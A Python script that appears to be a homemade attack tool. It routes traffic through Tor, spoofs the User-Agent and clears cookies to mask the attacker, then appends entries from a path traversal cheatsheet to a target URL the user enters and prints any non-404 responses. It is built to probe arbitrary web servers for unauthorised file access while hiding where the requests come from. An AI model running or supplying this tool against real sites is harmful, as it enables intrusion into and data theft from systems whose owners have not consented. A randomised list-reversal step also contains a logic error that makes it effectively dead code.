import requests
import time
import random
import re

#setting up an empty session
session = requests.session()
session.proxies = {}

#way to access DO NOT USE requests use session like this:
#r = session.get('https://jasonrigden.com')
#url="https://dnsleaktest.com"
#leak test
#it works, trust me

#check current IP
r = session.get("http://httpbin.org/ip")
print("The following is your REAL IP:\n", r.text, "\n")

#I create a new Session Object and add my proxies
#in order to change IP
session = requests.session()
session.proxies = {}

session.proxies["http"] = "socks5h://localhost:9050"
session.proxies["https"] = "socks5h://localhost:9050"

r = session.get("http://httpbin.org/ip")
print("The following is your NEW IP:\n", r.text, "\n")
#if it doesn't work just restart tor using: sudo service tor restart

#current user agent
#it will show versions info, that we are accesing through python script
r = session.get("https://httpbin.org/user-agent")
print("Current User Agent:\n",r.text)

#we must createw some request headers and change the User-agent
headers = {}
headers['User-agent'] = "HotJava/1.1.2 FCS"
#we include the headers in the request
r = session.get("https://httpbin.org/user-agent", headers=headers)
print("New user agent:\n", r.text)

#we now must kill the cookies!!!!
#first I check them
session.get('http://httpbin.org/cookies/set/sessioncookie/Hello')
r = session.get("http://httpbin.org/cookies")
print("My cookies:\n",r.text)

#KILL EM!!!!!!

session.cookies.clear()
r = session.get("http://httpbin.org/cookies")
print("My NEW cookies:\n",r.text)

#leak test
#it works, trust me
#r = session.get("https://dnsleaktest.com/")
#print("Leak test:\n",r.text)


print("ALL SETTED UP FOR YOU :)\n\n")

url_input = input("Enter URL:\t")

with open ("pathtraversal_cheatsheet") as f:
    cheat_sheet = f.readlines()

n = random.random()
if n%2 == 0:
    cheat_sheet.reverse()

i = 0
for cheat in cheat_sheet:
    try:
        url = url_input + cheat.replace("/", "%2F")
        print("Trying with:\t", url, "\n")
        r = session.get(url)
        if not re.search("404", r.text):
            print("--------------------------OUTPUT ", i, ":\n", r.text)
            exit = input("Continue?\t")
            if (exit != "Y" and exit != "Yes" and exit != "yes" and exit != "y"):
                print("The end!\n")
                break
            time.sleep(0.5)
        else:
            print("--------------------------OUTPUT", i, ":\t404 ERROR")
        i+=1
    except requests.exceptions.HTTPError as notfound:
        print("void page: 404")
        break
    except requests.exceptions.MissingSchema as missingschema:
        print("error url: missing schema")
        break
    except requests.exceptions.ConnectionError as nohost:
        print("host error: host doesn't exist")
        break

print("BYE")
